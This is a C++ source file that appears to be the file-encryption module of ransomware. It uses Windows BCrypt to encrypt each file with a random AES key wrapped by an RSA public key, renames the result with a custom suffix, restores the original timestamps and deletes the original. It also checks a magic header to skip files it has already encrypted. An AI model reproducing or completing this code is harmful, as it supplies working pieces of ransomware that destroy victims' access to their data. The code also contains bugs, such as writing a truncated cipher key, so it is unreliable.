#include "HSCrypto.h"

BOOLEAN 
Crypto::GenRandom(PUCHAR pbBuffer,
	ULONG cbBuffer)
{
	NTSTATUS status = BCryptGenRandom(NULL, pbBuffer, cbBuffer, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if (!NT_SUCCESS(status))
	{
		return(FALSE);
	}
	return(TRUE);
}

BOOLEAN Crypto::InitCrypto(PCRYPTO pCryptoObj, ULONG ucInitBufSize)
{
	BOOLEAN fOk = FALSE;

	if (!pCryptoObj || !ucInitBufSize)
	{
		return(FALSE);
	}
	do
	{
		pCryptoObj->hKey = INVALID_HANDLE_VALUE;
		pCryptoObj->hProv = INVALID_HANDLE_VALUE;
		pCryptoObj->pbInBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ucInitBufSize);
		if (!pCryptoObj->pbInBuffer)
		{
			break;
		}
		pCryptoObj->pbOutBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ucInitBufSize);
		if (!pCryptoObj->pbOutBuffer)
		{
			break;
		}
		pCryptoObj->hProv = RSA::InitRSA();
		if (INVALID_HANDLE_VALUE == pCryptoObj->hProv)
		{
			break;
		}
		fOk = TRUE;
	} while (FALSE);
	
	return(fOk);
}

VOID Crypto::DestroyCrypto(PCRYPTO pCryptoObj)
{
	if (!pCryptoObj)
	{
		return;
	}

	if (pCryptoObj->pbInBuffer)
	{
		HeapFree(GetProcessHeap(), 0, pCryptoObj->pbInBuffer);
		pCryptoObj->pbInBuffer = NULL;
	}

	if (pCryptoObj->pbOutBuffer)
	{
		HeapFree(GetProcessHeap(), 0, pCryptoObj->pbOutBuffer);
		pCryptoObj->pbOutBuffer = NULL;
	}

	if (INVALID_HANDLE_VALUE != pCryptoObj->hKey)
	{
		BCryptDestroyKey(pCryptoObj->hKey);
		pCryptoObj->hKey = INVALID_HANDLE_VALUE;
	}

	if (INVALID_HANDLE_VALUE != pCryptoObj->hProv)
	{
		BCryptCloseAlgorithmProvider(pCryptoObj->hProv, 0);
		pCryptoObj->hProv = INVALID_HANDLE_VALUE;
	}

	return;
}

BOOLEAN Crypto::GenKey(PCRYPTO pCryptoObj)
{
	BOOLEAN fOk = FALSE;
	NTSTATUS status = STATUS_SUCCESS;
	

	do 
	{ 
		// Initialize handle and generate key pair
		pCryptoObj->hProv = RSA::InitRSA();
		if (INVALID_HANDLE_VALUE == pCryptoObj->hProv)
		{
			break;
		}
		pCryptoObj->hKey = RSA::GenKey(pCryptoObj->hProv);
		if (INVALID_HANDLE_VALUE == pCryptoObj->hKey)
		{
			break;
		}
		fOk = TRUE;
	} while (FALSE);

	return(fOk);
}

BOOLEAN Crypto::ImportPublicKey(PCRYPTO pCryptObj, PUCHAR pbPublicBlob, ULONG cbPublicBlob)
{
	BOOLEAN fOk = FALSE;

	if (!pCryptObj || !pbPublicBlob || !cbPublicBlob)
	{
		return(FALSE);
	}
	do
	{
		pCryptObj->hKey = RSA::ImportKeyFromMem(pCryptObj->hProv, 
			BCRYPT_RSAPUBLIC_BLOB, 
			pbPublicBlob, 
			cbPublicBlob);
		if (INVALID_HANDLE_VALUE == pCryptObj->hKey)
		{
			break;
		}
		fOk = TRUE;
	} while (FALSE);

	return(fOk);
}

BOOLEAN Crypto::ImportPublicKey(PCRYPTO pCryptObj, LPCTSTR pPublicBlobFile)
{
	BOOLEAN fOk = FALSE;

	if (!pCryptObj || !pPublicBlobFile)
	{
		return(FALSE);
	}
	do
	{
		pCryptObj->hKey = RSA::ImportKeyFromFile(pCryptObj->hProv, BCRYPT_RSAPUBLIC_BLOB, pPublicBlobFile);
		if (INVALID_HANDLE_VALUE == pCryptObj->hKey)
		{
			break;
		}
		fOk = TRUE;
	} while (FALSE);
	
	return(fOk);
}

BOOLEAN Crypto::ImportPrivateKey(PCRYPTO pCryptObj, PUCHAR pbPrivateBlob, ULONG cbPrivateBlob)
{
	BOOLEAN fOk = FALSE;

	if (!pCryptObj || !pbPrivateBlob || !cbPrivateBlob)
	{
		return(FALSE);
	}
	do
	{
		pCryptObj->hKey = RSA::ImportKeyFromMem(pCryptObj->hProv,
			BCRYPT_RSAPRIVATE_BLOB,
			pbPrivateBlob,
			cbPrivateBlob);
		if (INVALID_HANDLE_VALUE == pCryptObj->hKey)
		{
			break;
		}
		fOk = TRUE;
	} while (FALSE);
	
	return(fOk);
}

BOOLEAN Crypto::ImportPrivateKey(PCRYPTO pCryptObj, LPCTSTR pPrivateBlobFile)
{
	BOOLEAN fOk = FALSE;

	if (!pCryptObj || !pPrivateBlobFile)
	{
		return(FALSE);
	}
	do
	{
		pCryptObj->hKey = RSA::ImportKeyFromFile(pCryptObj->hProv, BCRYPT_RSAPRIVATE_BLOB, pPrivateBlobFile);
		if (INVALID_HANDLE_VALUE == pCryptObj->hKey)
		{
			break;
		}
		fOk = TRUE;
	} while (FALSE);

	return(fOk);
}

BOOLEAN Crypto::Encrypt(PCRYPTO pCryptObj, LPCTSTR pFileName)
{
	UCHAR bMagic[MAGICSIZE] = { 0 };
	UCHAR bCipherKey[0x200] = { 0 };
	TCHAR tzTargetFile[MAX_PATH * 2] = { 0 };
	TCHAR tzTmpFile[MAX_PATH * 2] = { 0 };
	UCHAR bKey[HSAESKEYLEN] = { 0 };
	HANDLE hFile = INVALID_HANDLE_VALUE;
	FILETIME stCreateTime = { 0 };
	FILETIME stAccessTime = { 0 };
	FILETIME stWriteTime = { 0 };
	INT iLen = 0;
	ULONG cbRead = 0;
	ULONG cbWrite = 0;
	BOOLEAN fOk = FALSE;
	ULONG cbCipherKey = 0;
	ULONG nCryptType = 0;
	LARGE_INTEGER liFileSize = { 0 };
	HANDLE hWrite = INVALID_HANDLE_VALUE;
	BOOLEAN fSuffix = FALSE;

	_tcscpy_s(tzTargetFile, _countof(tzTargetFile), pFileName);
	iLen = _tcslen(tzTargetFile);
	LPTSTR pSuffix = (LPTSTR)_tcsrchr(tzTargetFile, TEXT('.'));
	if (!pSuffix)
	{
		_tcscat_s(tzTargetFile, _countof(tzTargetFile) - iLen, HSUFFIX);
	}
	else
	{
		fSuffix = TRUE;
		if (!_tcsicmp(pSuffix, HSUFFIX) || !_tcsicmp(pSuffix, HSUFFIXTEMP))
		{
			// return directly if encrypted
			return(TRUE);
		}
		else
		{
			// change the suffix if not encrypted
			_tcscat_s(pSuffix, _countof(tzTargetFile) - iLen, HSUFFIX);
		}
	}
	do
	{
		hFile = CreateFile(pFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			DEBUG("Failed to open original file, %d", GetLastError());
			break;
		}
		GetFileTime(hFile, &stCreateTime, &stAccessTime, &stWriteTime);

		// read 8 bytes of the magic number, check if encrypted
		fOk = ReadFile(hFile, bMagic, sizeof(bMagic), &cbRead, NULL);
		if (fOk && !memcmp(bMagic, HSMAGIC, sizeof(bMagic)))
		{
			// there's magic number in the file, it means it's encrypted file
			// you need to check it 
		
			// the length of cipher key, if it's 0x100, it may be the encrypted file
			fOk = ReadFile(hFile, &cbCipherKey, sizeof(cbCipherKey), &cbRead, 0);
			if (fOk && cbCipherKey == 0x100)
			{
				//fOk = ReadFile(hFile, bCipherKey, cbCipherKey, &cbRead, 0);
				SetFilePointer(hFile, cbCipherKey, NULL, FILE_CURRENT);
				fOk = ReadFile(hFile, &nCryptType, sizeof(nCryptType), &cbRead, 0);
				if (fOk && nCryptType == HSENCTYPE)
				{
					CloseHandle(hFile);
					hFile = INVALID_HANDLE_VALUE;

					return(TRUE);
				}
			}
		}
		GetFileSizeEx(hFile, &liFileSize);
		SetFilePointer(hFile, NULL, 0, FILE_BEGIN);
		
		if (fSuffix)
		{
			_tcscpy_s(tzTmpFile, _countof(tzTmpFile), pFileName);
			LPCTSTR pTmpPtr = _tcschr(tzTmpFile, TEXT('.'));
			*(LPTSTR)pTmpPtr = L'\0';
			_tcscat_s(tzTmpFile, _countof(tzTmpFile) - (pTmpPtr - tzTmpFile + 1), HSUFFIXTEMP);
		}
		else
		{
			_tcscat_s(tzTmpFile, _countof(tzTmpFile), HSUFFIXTEMP);
		}
		//_stprintf_s(tzTmpFile, TEXT("%s%s"), pFileName, HSUFFIXTEMP);
		// create a tempature file
		hWrite = CreateFile(tzTmpFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hWrite)
		{
			break;
		}
		// generate AES128 key
		GenRandom(bKey, sizeof(bKey));
		// use RSA2048 to encrypt it's original key and generate 512 bytes cipher key
		fOk = RSA::Encrypt(pCryptObj->hKey, bKey, sizeof(bKey), bCipherKey, sizeof(bCipherKey), &cbCipherKey);
		if (!fOk)
		{
			break;
		}
		// initialize
		//AES::InitAESObj(&pCryptObj->stAesObj);
		if (!AES::HSInitAES(&pCryptObj->stAesObj))
		{
			break;
		}
		if (!AES::GenKey(&pCryptObj->stAesObj, bKey, sizeof(bKey)))
		{
			break;
		}
		// write in the magic number
		fOk = WriteFile(hWrite, HSMAGIC, MAGICSIZE, &cbWrite, NULL);
		if (!fOk)
		{
			break;
		}
		// write the cipher key size to file
		fOk = WriteFile(hWrite, &cbCipherKey, sizeof(cbCipherKey), &cbWrite, 0);
		if (!fOk)
		{
			break;
		}
		// write in the cipher key to file
		fOk = WriteFile(hWrite, bCipherKey, sizeof(cbCipherKey), &cbWrite, 0);
		if (!fOk)
		{
			break;
		}
		// write in the encrypt type
		ULONG EncryptOP = HSENCTYPE;
		fOk = WriteFile(hWrite, &EncryptOP, sizeof(EncryptOP), &cbWrite, 0);
		if (!fOk)
		{
			break;
		}
		// write in the filesize
		fOk = WriteFile(hWrite, &liFileSize.QuadPart, sizeof(liFileSize.QuadPart), &cbWrite, 0);
		if (!fOk)
		{
			break;
		}
		ULONG cbData = 0;
		LARGE_INTEGER cbSize;
		PUCHAR pbInBlock = pCryptObj->pbInBuffer;
		PUCHAR pbOutBlock = pCryptObj->pbInBuffer;
		ULONG cbInBlock = 0;
		ULONG cbOutBlock = 0;

		cbSize.QuadPart = liFileSize.QuadPart;
		while (cbSize.QuadPart > 0)
		{
			cbInBlock = (cbSize.QuadPart < HSIOBUFSIZE ? cbSize.LowPart : HSIOBUFSIZE);
			fOk = ReadFile(hFile, pbInBlock, cbInBlock, &cbRead, NULL);
			if (!fOk || cbRead != cbInBlock)
			{
				break;
			}
			cbOutBlock = ((cbInBlock + 15) >> 4) << 4;
			if (cbOutBlock > cbInBlock)
			{
				RtlZeroMemory(pbInBlock + cbInBlock, cbOutBlock - cbInBlock);
			}
			AES::Encrypt(&pCryptObj->stAesObj, pbInBlock, cbOutBlock, pbOutBlock, HSIOBUFSIZE, &cbData);
			fOk = WriteFile(hWrite, pbOutBlock, cbOutBlock, &cbWrite, NULL);
			if (!fOk || cbWrite != cbOutBlock)
			{
				break;
			}
			cbSize.QuadPart -= cbInBlock;
		}

		SetFileTime(hWrite, &stCreateTime, &stAccessTime, &stWriteTime);
		if (INVALID_HANDLE_VALUE != hFile)
		{
			CloseHandle(hFile);
			hFile = INVALID_HANDLE_VALUE;
		}
		if (INVALID_HANDLE_VALUE != hWrite)
		{
			CloseHandle(hWrite);
			hWrite = INVALID_HANDLE_VALUE;
		}
		
		fOk = MoveFile(tzTmpFile, tzTargetFile);
		if (fOk)
		{
			SetFileAttributes(tzTargetFile, FILE_ATTRIBUTE_NORMAL);
			DeleteFile(pFileName);
		}
		else
		{
			DeleteFile(tzTmpFile);
		}

		fOk = TRUE;
	} while (FALSE);
	
	if (hFile && INVALID_HANDLE_VALUE != hFile)
	{
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;
	}
	if (hWrite && INVALID_HANDLE_VALUE != hWrite)
	{
		CloseHandle(hWrite);
		hWrite = INVALID_HANDLE_VALUE;
	}
	
	return(fOk);
}